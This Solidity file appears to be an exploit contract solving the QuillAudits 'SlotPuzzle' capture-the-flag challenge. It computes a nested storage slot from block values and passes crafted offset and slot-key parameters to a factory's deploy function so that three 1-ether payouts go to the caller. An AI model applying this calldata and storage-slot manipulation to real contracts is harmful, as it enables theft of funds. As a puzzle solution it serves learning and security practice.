// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import "./SlotPuzzle.sol";
import "hardhat/console.sol";

contract SlotPuzzleQuillAttack {

    function attack(address target) public {
        uint salt;
        if (block.number > block.basefee) {
            salt = block.number - block.basefee;
        } else {
            salt = block.basefee - block.number;
        }
        bytes32 slot1 = keccak256(abi.encode(tx.origin, uint256(1)));
        bytes32 slot2 = keccak256(abi.encode(block.number, slot1));
        bytes32 slot3 = keccak256(abi.encode(block.timestamp, uint256(slot2)+1));
        bytes32 slot4 = keccak256(abi.encode(target, slot3));
        bytes32 slot5 = keccak256(abi.encode(block.prevrandao, uint256(slot4)+1));
        bytes32 slot6 = keccak256(abi.encode(block.coinbase, slot5));
        bytes32 slot7 = keccak256(abi.encode(block.chainid, uint256(slot6)+1));
        bytes32 slot8 = keccak256(abi.encode(address(uint160(uint256(blockhash(salt)))), slot7));
        bytes32 slot = keccak256(abi.encode(slot8));  // bytes32[] hash
       
        Recipients memory r;
        r.account = msg.sender;
        r.amount = 1 ether;
        Recipients[] memory recipients = new Recipients[](3);
        recipients[0] = r;
        recipients[1] = r;
        recipients[2] = r;

        Parameters memory p;
        p.recipients = recipients;
        p.totalRecipients = 3;
        p.offset = 452;  // after slot
        p.slotKey = abi.encode(slot, uint256(420-128));  // realslot->420  0x80+v(offset)=realslot

        ISlotPuzzleFactoryQuill(target).deploy(p);        
    }
    

    receive() external payable {}
}